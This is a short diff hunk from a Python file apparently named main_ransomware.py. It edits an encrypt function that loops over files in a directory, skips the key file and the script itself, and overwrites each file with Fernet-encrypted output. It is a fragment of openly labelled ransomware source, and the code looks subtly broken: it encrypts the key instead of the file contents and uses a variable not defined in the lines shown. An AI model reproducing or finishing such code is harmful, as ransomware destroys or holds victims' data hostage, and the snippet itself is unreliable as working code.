@@ -44,7 +44,7 @@ def encrypt(dir):
         if content[file_id] == "key.key" or content[file_id] == "main_ransomware.py":
             continue
 
-        with open(content[file_id], 'wb') as encrypted_file:
+        with open(file_name, 'wb') as encrypted_file:
 
             fernet = Fernet(key=key)
             encrypted_text = Fernet.encrypt(fernet, key)
